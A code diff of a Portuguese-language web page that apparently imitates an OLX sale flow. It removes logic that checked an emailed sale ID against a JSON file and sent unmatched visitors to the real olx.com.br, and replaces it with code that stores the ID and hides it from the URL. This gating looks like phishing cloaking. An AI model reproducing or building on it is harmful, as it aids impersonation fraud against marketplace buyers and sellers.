@@ -129,7 +129,7 @@
             width: 100%;
             height: 100%;
             background-color: #f2f4f5;
-            display: flex;
+            display: none;
             align-items: center;
             justify-content: center;
             flex-direction: column;
@@ -137,8 +137,14 @@
             gap: 20px;
         }
 
-        .loading-overlay.hidden {
-            display: none;
+        .loading-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
 
         .loading-header {
@@ -191,7 +197,7 @@
             </div>
         </div>
         <div class="spinner-simple"></div>
-        <div class="loading-text">Validando acesso...</div>
+        <div class="loading-text">Carregando...</div>
     </div>
 
     <div class="container">
@@ -237,58 +243,24 @@
     </div>
 
     <script>
-        const URL_REDIRECIONAMENTO = 'https://www.olx.com.br'; 
-
-        document.addEventListener('DOMContentLoaded', async function() {
+        // Verificar se há ID da venda na URL (vem do link do email)
+        document.addEventListener('DOMContentLoaded', function() {
             const urlParams = new URLSearchParams(window.location.search);
             const vendaId = urlParams.get('id');
             
-            // 1. Se não houver ID na URL, manda direto para a OLX
-            if (!vendaId || vendaId.trim() === '') {
-                window.location.href = URL_REDIRECIONAMENTO;
-                return;
-            }
-
-            try {
-                // 2. Lê o arquivo JSON na pasta data
-                const resposta = await fetch('data/vendas.json');
-                const dadosSistema = await resposta.json();
-
-                let vendaEncontrada = null;
-
-                // 3. Procura no array se algum item possui o "codigo" igual ao ID da URL
-                if (Array.isArray(dadosSistema)) {
-                    vendaEncontrada = dadosSistema.find(item => {
-                        return item && String(item.codigo).trim() === String(vendaId).trim();
-                    });
-                }
-
-                // 4. Se não encontrar o código correspondente, redireciona para a OLX
-                if (!vendaEncontrada) {
-                    window.location.href = URL_REDIRECIONAMENTO;
-                    return;
-                }
-
-                // 5. Se encontrou, salva o ID e todos os dados da venda no localStorage
+            if (vendaId) {
+                // Armazenar o ID da venda para usar no fluxo
                 localStorage.setItem('vendaId', vendaId);
-                localStorage.setItem('dadosVenda', JSON.stringify(vendaEncontrada));
-                
-                // Oculta o ID da URL sem recarregar a página
-                window.history.replaceState(null, '', window.location.pathname);
-                
-                // Libera a visualização da página removendo o loading
-                document.getElementById('loadingOverlay').classList.add('hidden');
+                console.log('ID da venda armazenado:', vendaId);
 
-            } catch (erro) {
-                console.error('Erro ao verificar o JSON:', erro);
-                window.location.href = URL_REDIRECIONAMENTO;
+                // Ocultar o id da URL sem recarregar a página
+                window.history.replaceState(null, '', window.location.pathname);
             }
         });
 
         function mostrarLoading(e) {
             const loadingOverlay = document.getElementById('loadingOverlay');
-            loadingOverlay.classList.remove('hidden');
-            loadingOverlay.querySelector('.loading-text').textContent = 'Carregando...';
+            loadingOverlay.classList.add('active');
             setTimeout(() => {
                 window.location.href = e.target.href;
             }, 2000);
